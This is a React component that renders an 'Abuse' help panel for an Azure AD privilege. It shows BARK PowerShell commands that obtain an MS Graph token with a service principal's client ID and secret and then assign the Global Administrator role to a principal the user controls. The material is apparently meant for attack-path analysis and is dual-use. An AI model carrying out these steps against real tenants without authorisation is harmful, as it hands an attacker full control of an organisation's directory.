import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                To abuse this privilege, you can promote a principal you control 
                to Global Administrator using BARK's New-AzureADRoleAssignment.
            </p>

            <p>
                This function requires you to supply an MS Graph-scoped JWT 
                associated with the Service Principal that has the privilege 
                to grant AzureAD admin roles. There are several ways to
                acquire a JWT. For example, you may use BARK’s
                Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
                by supplying a Service Principal Client ID and secret:
            </p>

                <pre>
                    <code>
                        {
                            '$MGToken = Get-MSGraphTokenWithClientCredentials `\n' +
                            '    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n' +
                            '    -ClientSecret "asdf..." `\n' +
                            '    -TenantName "contoso.onmicrosoft.com"'
                        }
                    </code>
                </pre>

            <p>
                Then use BARK's New-AzureADRoleAssignment function to grant the 
                AzureAD role to your target principal:
            </p>

                <pre>
                    <code>
                        {
                            'New-AzureADRoleAssignment `\n' +
                            '    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n' +
                            '    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n' +
                            '    -Token $MGToken'
                        }
                    </code>
                </pre>

            <p>
                If successful, the output will include the principal ID, the role ID, and a 
                unique ID for the role assignment.
            </p>
        </>
    );
};

export default Abuse;
